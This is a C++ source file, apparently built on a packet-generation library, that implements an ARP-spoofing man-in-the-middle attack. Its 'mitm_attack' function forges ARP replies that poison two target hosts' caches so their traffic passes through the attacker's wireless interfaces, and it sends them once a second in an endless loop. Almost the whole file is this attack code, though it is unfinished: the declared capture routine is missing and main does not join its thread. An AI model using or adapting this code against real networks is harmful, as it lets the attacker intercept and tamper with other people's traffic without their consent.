#include "pgen.h"
#include <stdio.h>
#include <pcap.h>
#include <thread>

const char* dev1 = "wlan0";
const char* dev2 = "wlan1";

const char* dumpfile = "dump.pcap";

void mitm_attack(const char* ip1, const char* mac1, 
					const char* ip2, const char* mac2);
void capture(const char* ip1, const char* ip2);



int main(int argc,char** argv){
	if(argc != 5){
		printf("args\n");
		return -1;
	}

	std::thread mitm(mitm_attack, argv[1], argv[2], argv[3], argv[4]);
}


void mitm_attack(const char* ip1, const char* mac1, 
					const char* ip2, const char* mac2){
	pgen_arp pack_to_target1;
	pgen_arp pack_to_target2;

	//pack_to_target1.ETH.src = pgen_getMAC(dev);
	pack_to_target1.ETH.src.setmacbydev(dev1);
	pack_to_target1.ETH.dst = mac1;
	pack_to_target1.ARP.srcEth.setmacbydev(dev1);
	pack_to_target1.ARP.srcIp  = ip2;
	pack_to_target1.ARP.dstEth = mac1;
	pack_to_target1.ARP.dstIp  = ip1;
	pack_to_target1.ARP.operation = PGEN_ARPOP_REPLY;

	pack_to_target2.ETH.src.setmacbydev(dev2);
	pack_to_target2.ETH.dst = mac2;
	pack_to_target2.ARP.srcEth.setmacbydev(dev2);
	pack_to_target2.ARP.srcIp  = ip1;
	pack_to_target2.ARP.dstEth = mac2;
	pack_to_target2.ARP.dstIp  = ip2;
	pack_to_target2.ARP.operation = PGEN_ARPOP_REPLY;

	for(int i=0; ; i++){
		printf("0x%04x: %s[%s] <MITM> %s[%s] \n", i, 
				pack_to_target1.ARP.dstIp.c_str(),
				pack_to_target1.ARP.dstEth.c_str(),
				pack_to_target2.ARP.dstIp.c_str(),
				pack_to_target2.ARP.dstEth.c_str() );

		pack_to_target1.SEND(dev1);
		pack_to_target2.SEND(dev2);
		sleep(1);
	}		
}


